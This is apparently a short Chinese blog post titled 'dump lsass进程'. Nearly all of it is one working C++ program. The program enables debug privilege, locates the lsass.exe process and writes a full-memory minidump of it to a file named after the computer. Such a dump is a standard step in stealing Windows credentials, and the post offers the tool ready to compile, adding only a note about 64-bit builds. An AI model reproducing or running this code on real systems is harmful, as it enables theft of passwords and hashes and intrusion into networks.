---
title: dump lsass进程
date: 2020-03-09 22:24:50
tags:
---

> 64位系统需要编译64位,否则无法获取

```cpp
#include <windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <TlHelp32.h>

#pragma comment ( lib, "dbghelp.lib" )

using namespace std;


#define INFO_BUFFER_SIZE 32767

std::wstring s2ws(const std::string& s)
{
        int len;
        int slength = (int)s.length() + 1;
        len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);
        wchar_t* buf = new wchar_t[len];
        MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
        std::wstring r(buf);
        delete[] buf;
        return r;
}
bool EnableDebugPrivilege()
{
    HANDLE hToken;
    LUID sedebugnameValue;
    TOKEN_PRIVILEGES tkp;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        return   FALSE;
    }
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue))
    {
        CloseHandle(hToken);
        return false;
    }
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = sedebugnameValue;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL))
    {
        CloseHandle(hToken);
        return false;
    }
    return true;
}

int main() {
        char filename[INFO_BUFFER_SIZE];
        char infoBuf[INFO_BUFFER_SIZE];
        DWORD  bufCharCount = INFO_BUFFER_SIZE;
        GetComputerNameA(infoBuf, &bufCharCount);
        strcpy(filename,infoBuf);
        strcat( filename, "-" );
        strcat( filename, "lsass.dmp" );

        DWORD lsassPID = 0;
        HANDLE lsassHandle = NULL; 
        HANDLE outFile = CreateFileA(filename, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32 processEntry = {};
        processEntry.dwSize = sizeof(PROCESSENTRY32);
        LPCWSTR processName = L"";

        if (Process32First(snapshot, &processEntry)) {
                while (_wcsicmp(processName, L"lsass.exe") != 0) {
                        Process32Next(snapshot, &processEntry);
                        processName = processEntry.szExeFile;
                        lsassPID = processEntry.th32ProcessID;
                }
                wcout << "[+] Got lsass.exe PID: " << lsassPID << endl;
        }
                
                if (EnableDebugPrivilege() == false)
                {
        printf("enable %d", GetLastError());
                }
        EnableDebugPrivilege();
        lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);
        BOOL isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
        
        if (isDumped) {
                cout <<"[+] Save To "<<filename<<endl;
                cout << "[+] lsass dumped successfully!" << endl;
        }
        
    return 0;
}
```